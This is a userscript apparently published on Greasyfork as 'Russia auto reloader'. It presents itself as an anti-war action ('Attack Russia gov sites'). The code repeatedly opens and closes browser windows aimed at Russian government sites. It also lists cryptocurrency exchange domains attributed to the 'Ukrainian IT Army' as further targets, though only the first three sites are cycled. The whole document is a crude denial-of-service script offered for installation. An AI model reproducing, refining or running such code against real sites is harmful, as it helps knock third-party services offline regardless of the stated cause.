// ==UserScript==
// @name:ja     ロシアオートリローダー
// @name        Russia auto reloader
// @namespace   https://greasyfork.org/moniter_support
// @version     0.0.2
// @description:ja 戦争だめ！ロシア政府等サイトの自動リロード
// @description No War! Attack Russia gov sites.
// @author      monitor_support
// @match       https://mi.5ch.net/test/read.cgi/news4vip/1646137432/*
// @license     PDS
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/440770/Russia%20auto%20reloader.user.js
// @updateURL https://update.greasyfork.org/scripts/440770/Russia%20auto%20reloader.meta.js
// ==/UserScript==

(function() {
    'use strict';
	var test=1;

	var count=0;

	var rusite=[
		"http://gov.ru/",
		"http://kremlin.ru",
		"http://government.ru/",

		/* add by Ukrainian IT Army */
		"https://cleanbtc.ru/",
		"https://bonkypay.com/",
		"https://changer.club/",
		"https://superchange.net/",
		"https://mine.exchange/",
		"https://platov.co/",
		"https://ww-pay.net/",
		"https://delets.cash/",
		"https://betatransfer.org/",
		"https://ramon.money/",
		"https://coinpaymaster.com/",
		"https://bitokk.biz/",
		"https://www.netex24.net",
		"https://cashbank.pro/",
		"https://flashobmen.com/",
		"https://abcobmen.com/",
		"https://ychanger.net/",
		"https://multichange.net/",
		"https://royal.cash/",
		"https://prostocash.com/",
		"https://baksman.org/",
		"https://kupibit.me/",
		"https://abcobmen.com/",
	];
	setInterval(function() {
		count++
        window.open(rusite[count % 3], count);
		setTimeout(function() {
			window.open('about:blank',count).close();
		}, 2000);
	},200 + test * 10000);
})();
